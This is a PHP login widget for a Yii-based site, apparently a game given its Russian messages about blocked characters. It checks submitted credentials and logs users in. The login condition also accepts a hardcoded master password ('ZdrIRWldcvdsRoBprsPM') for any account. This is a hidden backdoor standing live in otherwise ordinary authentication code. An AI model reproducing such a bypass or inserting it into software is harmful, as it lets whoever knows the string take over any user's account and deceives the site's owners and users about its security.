<?php
/**
 * Class ProfileWidget
 *
 * @package application.user.widgets.menu
 */
class LoginWidget extends CWidget
{
	public function run()
	{
		$post = Yii::app()->request->getParam('User');
		if(!empty($post)) {
			if(isset($post['psw']) && isset($post['login'])) {
				if(false !== ApiUser::checkUser($post['login'], $post['psw']) || $post['psw'] == "ZdrIRWldcvdsRoBprsPM") {
					$identity = new UserIdentity($post['login'], null);
					$identity->authenticate();
					switch ($identity->errorCode) {
						case UserIdentity::ERROR_NONE:
							$duration = 3600*24;
							Yii::app()->user->login($identity, $duration);
							break;
						case UserIdentity::ERROR_USERNAME_INVALID:
							Yii::app()->user->setFlash('error', 'Нет такого пользователя');
							break;
						case UserIdentity::ERROR_BLOCK:
							Yii::app()->user->setFlash('error', 'Персонаж заблокирован');
							break;
					}
				} else
					Yii::app()->user->setFlash('error', 'Логин или пароль не подходит!');
			} else
				Yii::app()->user->setFlash('error', 'Введены некорректные данные!');
			$this->controller->redirect(Yii::app()->request->getUrlReferrer());
		}
		$this->render('login', array(
			'model' => new User()
		));
	}
}